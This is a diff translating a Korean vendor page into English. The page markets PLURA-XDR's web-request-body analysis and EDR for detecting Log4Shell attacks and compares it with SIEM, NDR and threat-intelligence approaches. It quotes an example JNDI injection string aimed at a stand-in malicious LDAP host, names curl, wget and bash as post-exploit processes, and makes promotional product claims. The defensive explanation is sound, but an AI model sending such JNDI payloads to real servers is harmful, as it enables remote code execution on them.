@@ -1,71 +1,71 @@
-## `사례 1` Log4j(Log4Shell) 취약점 공격 탐지
+## `Case 1` Detecting Log4j (Log4Shell) Vulnerability Attacks
 
-### **1️⃣ 기존 위협 헌팅(SIEM + EDR + NDR + TI)이 탐지하지 못하는 이유**
-| **비교 항목** | **기존 위협 헌팅 (SIEM + EDR + NDR + TI)** | **PLURA 웹 요청 본문 분석 + EDR** |
+### **1️⃣ Why Traditional Threat Hunting (SIEM + EDR + NDR + TI) Fails to Detect It**
+| **Comparison Items** | **Traditional Threat Hunting (SIEM + EDR + NDR + TI)** | **PLURA Web Request Body Analysis + EDR** |
 |----------|-------------------------------|-------------------------------|
-| **탐지 방식** | IOC(위협 인텔리전스) 기반 탐지 → 기존 패턴 매칭에 의존하여 새로운 공격 탐지 어려움 | 행위 기반 탐지 → 웹 요청 본문과 실행 행위까지 실시간 분석하여 신규 공격 탐지 가능 |
-| **웹 애플리케이션 공격 탐지** | 웹 요청 헤더, URL 분석만 가능 → 요청 본문 내부의 악성 패턴 분석 불가능 | **웹 요청 본문을 실시간 분석하여 JNDI 호출 패턴 탐지 가능** |
-| **네트워크 트래픽 분석** | NDR이 SSL 복호화 후 패킷 분석 가능하지만 요청 본문 분석 불가 | **요청 본문을 분석하여 JNDI 패턴 포함 여부를 확인하고 탐지 가능** |
-| **엔드포인트 보안** | EDR이 실행된 프로세스를 감지 가능하지만, 웹 애플리케이션에서 발생한 공격과의 연계 분석 어려움 | **EDR이 원격 코드 실행(RCE) 발생 시, 악성 프로세스 실행(Fork, Execve) 탐지 가능** |
+| **Detection Method** | IOC (Threat Intelligence)-based detection → Relies on known pattern matching, making it difficult to detect new attacks | Behavior-based detection → Analyzes web request body and execution behaviors in real-time to detect new attacks |
+| **Web Application Attack Detection** | Can analyze web request headers and URLs but cannot analyze malicious patterns within request bodies | **Can analyze web request bodies in real-time to detect JNDI invocation patterns** |
+| **Network Traffic Analysis** | NDR can analyze packets after SSL decryption but cannot analyze request bodies | **Can analyze request bodies to detect JNDI patterns** |
+| **Endpoint Security** | EDR can detect executed processes but struggles to correlate them with web application attacks | **EDR can detect remote code execution (RCE) and malicious process execution (Fork, Execve) in real-time** |
 
-### **2️⃣ 기존 위협 헌팅이 탐지하지 못하는 이유 상세 설명**
-1. **SIEM + TI(Threat Intelligence) 한계**  
-   - 기존 SIEM 및 TI는 **정적 IOC(Indicator of Compromise) 기반 탐지**에 의존합니다.  
-   - 즉, **이미 알려진 악성 IP, 도메인, 파일 해시 값 등을 기반으로 탐지**하기 때문에, Log4j처럼 **새롭게 등장한 취약점을 이용한 공격을 탐지하기 어려움**.  
-   - 공격자들이 **새로운 JNDI 호출 변형(payload 변형)을 이용하면 IOC 매칭을 우회**할 수 있음.  
+### **2️⃣ Detailed Explanation of Why Traditional Threat Hunting Fails**
+1. **Limitations of SIEM + TI (Threat Intelligence)**  
+   - Traditional SIEM and TI rely on **static IOC (Indicator of Compromise)-based detection**.  
+   - Since they **detect threats based on known malicious IPs, domains, and file hashes**, they struggle to detect **newly emerging vulnerabilities like Log4j**.  
+   - **Attackers can evade IOC matching by using new JNDI payload variations**.  
 
-2. **NDR(네트워크 기반 탐지)의 한계**  
-   - NDR은 **SSL 복호화를 통해 네트워크 트래픽을 분석할 수 있지만, 요청 본문(payload)까지 정밀하게 분석하지 못함**.  
-   - 즉, `jndi:ldap://malicious.com/exploit` 같은 **악성 페이로드가 포함된 웹 요청의 본문을 분석할 수 없음**.  
-   - 네트워크 단에서 악성 트래픽이 발생할 수 있지만, **로그의 맥락(context)을 고려한 분석이 어려움**.  
+2. **Limitations of NDR (Network Detection & Response)**  
+   - NDR can **analyze network traffic by decrypting SSL but lacks the ability to analyze request bodies (payloads) in depth**.  
+   - As a result, it **cannot detect malicious payloads like `jndi:ldap://malicious.com/exploit` embedded within web requests**.  
+   - Although network-layer anomalies may be detected, **NDR struggles to analyze logs in context**.  
 
-3. **EDR(엔드포인트 보안)의 한계**  
-   - EDR은 웹 서버 내에서 발생하는 악성 프로세스 실행(`curl`, `wget`, `bash` 등)을 감지할 수 있음.  
-   - 하지만, **웹 애플리케이션에서 공격이 시작된 원인을 직접 분석하지 못하기 때문에, 웹 요청과 실행 프로세스 간의 연관성을 파악하기 어려움**.  
-   - 즉, **웹 요청 → 악성 코드 실행**까지의 공격 흐름을 제대로 분석하지 못하면, 단순한 이상 프로세스로 오탐할 가능성이 있음.  
+3. **Limitations of EDR (Endpoint Detection & Response)**  
+   - EDR can detect malicious process executions (`curl`, `wget`, `bash`, etc.) occurring within web servers.  
+   - However, **it cannot directly analyze the source of an attack within web applications, making it difficult to correlate web requests with executed processes**.  
+   - Without **a complete attack flow analysis (Web Request → Malicious Code Execution), false positives may occur**.  
+
+---
+
+### **3️⃣ Detecting Attacks with PLURA Web Request Body Analysis + EDR**
+✅ **1) Detecting Malicious Patterns via Web Request Body Analysis**  
+   - PLURA **analyzes web request bodies in real-time** to detect patterns like `jndi:ldap://malicious.com/exploit`.  
+   - It detects **abnormal LDAP and RMI invocations within search fields, user input values, HTTP headers, and API request bodies**.  
+   - Unlike traditional WAFs, **it can analyze various JNDI payload variations to detect obfuscated attacks**.  
+
+✅ **2) Execution Behavior-Based Detection and Blocking (EDR Integration)**  
+   - If an attack succeeds and results in remote code execution (RCE),  
+   - PLURA EDR **detects new process creation events (Fork, Execve) at the kernel level**.  
+   - For example, if processes like `curl`, `wget`, or `bash` execute post-exploit, they can be detected and blocked instantly.  
+
+✅ **3) Correlating Attack Flows to Block Further Attacks**  
+   - Even if an attack bypasses IOC-based detection, **PLURA can detect patterns where LDAP/RMI requests lead to specific process executions and preemptively block additional attacks**.  
+   - Attackers attempting to **evade signature-based detection with JNDI payload modifications** can still be detected through **behavior analysis**.  
 
 ---
 
-### **3️⃣ PLURA 웹 요청 본문 분석 + EDR을 통한 탐지 방법**
-✅ **1) 웹 요청 본문 분석을 통해 악성 패턴 탐지**  
-   - PLURA는 **웹 요청 본문을 실시간 분석**하여 `jndi:ldap://malicious.com/exploit`와 같은 패턴을 탐지 가능.  
-   - 검색창, 유저 입력값, HTTP 헤더, API 요청 본문에서 **비정상적인 LDAP, RMI 호출 탐지 가능**.  
-   - 기존 WAF가 탐지하지 못하는 **다양한 JNDI 호출 변형을 분석하여 우회 공격도 탐지 가능**.  
-
-✅ **2) 실행 행위 기반 탐지 및 차단 (EDR 연계)**  
-   - 공격이 성공하여 원격 코드 실행(RCE)이 발생할 경우,  
-   - PLURA EDR이 **커널 레벨에서 새로운 프로세스 생성 이벤트(Fork, Execve) 탐지**.  
-   - 예를 들어, 공격 성공 후 `curl`, `wget`, `bash` 등의 프로세스가 실행되면 이를 감지하여 즉시 차단 가능.  
-
-✅ **3) 공격 흐름을 상관 분석하여 추가 공격 차단**  
-   - 기존 IOC 기반 탐지가 어려운 공격이라도, **LDAP/RMI 요청 이후 특정 프로세스가 실행되는 패턴을 탐지하여 추가 공격을 사전 차단 가능**.  
-   - 즉, 공격자가 **JNDI 호출 변형을 사용하여 시그니처 기반 탐지를 우회**하려 해도 **행위 분석을 통해 탐지 가능**.  
-
----
-### **4️⃣ Log4j(Log4Shell) 공격 흐름**  
+### **4️⃣ Log4j (Log4Shell) Attack Flow**  
 ```mermaid
 graph TD
-    A[공격자] -->|JNDI Payload 포함 요청| B[취약한 웹 애플리케이션]
-    B -->|로그 저장| C[Log4j 취약점 존재]
-    C -->|JNDI Lookup 수행| D[외부 악성 서버 접속]
-    D -->|악성 코드 전송| E[웹 서버에서 RCE 발생]
-    E -->|백도어 설치| F[공격 성공]
+    A[Attacker] -->|Request containing JNDI Payload| B[Vulnerable Web Application]
+    B -->|Log Stored| C[Log4j Vulnerability Exists]
+    C -->|Performs JNDI Lookup| D[Connects to Malicious External Server]
+    D -->|Sends Malicious Code| E[RCE Occurs on Web Server]
+    E -->|Backdoor Installed| F[Attack Success]
 
-    %% PLURA 탐지 및 대응
-    B -->|웹 요청 본문 분석| X[PLURA 탐지 시스템]
-    X -->|JNDI 패턴 탐지| Y[공격 차단]
-    E -->|프로세스 모니터링| Z[EDR 탐지 및 실행 차단]
+    %% PLURA Detection and Response
+    B -->|Web Request Body Analysis| X[PLURA Detection System]
+    X -->|Detects JNDI Patterns| Y[Attack Blocked]
+    E -->|Process Monitoring| Z[EDR Detection & Execution Blocking]
 ```
-
 
 ---
 
-### **📌 결론: PLURA 웹 요청 본문 분석 + EDR이 Log4j 공격 탐지에서 뛰어난 이유**
-✅ **기존 위협 헌팅(SIEM + EDR + NDR + TI)은 IOC 기반 탐지에 의존하여 Log4j처럼 새로운 공격 패턴을 탐지하는 데 한계가 있음**.  
-✅ **PLURA-XDR은 웹 요청 본문을 분석하고 행위 기반 탐지를 수행하여 Log4j 공격을 실시간으로 탐지 가능**.  
-✅ **WAF를 우회하는 공격, 크리덴셜 스터핑, API Abuse, 랜섬웨어 탐지까지 대응 가능**.  
-✅ **EDR 연계를 통해 커널 레벨에서 악성 프로세스 실행, 웹쉘 설치, 파일 변조(FIM) 등을 탐지하여 공격자의 추가 행위를 차단**.  
+### **📌 Conclusion: Why PLURA Web Request Body Analysis + EDR Excels in Detecting Log4j Attacks**  
+✅ **Traditional threat hunting (SIEM + EDR + NDR + TI) relies on IOC-based detection, making it difficult to detect new attack patterns like Log4j**.  
+✅ **PLURA-XDR analyzes web request bodies and performs behavior-based detection, enabling real-time detection of Log4j attacks**.  
+✅ **Capable of detecting attacks that bypass WAFs, credential stuffing, API abuse, and even ransomware attacks**.  
+✅ **Through EDR integration, it detects and blocks additional attacker actions at the kernel level, such as malicious process execution, web shell installation, and file modifications (FIM)**.  
 
-🔹 **PLURA-XDR은 기존 보안 체계가 탐지하지 못하는 Zero-Day 공격까지 대응할 수 있는 차세대 보안 플랫폼입니다.** 🚀  
+🔹 **PLURA-XDR is a next-generation security platform capable of detecting and blocking Zero-Day attacks that traditional security systems fail to catch.** 🚀
 
 ---
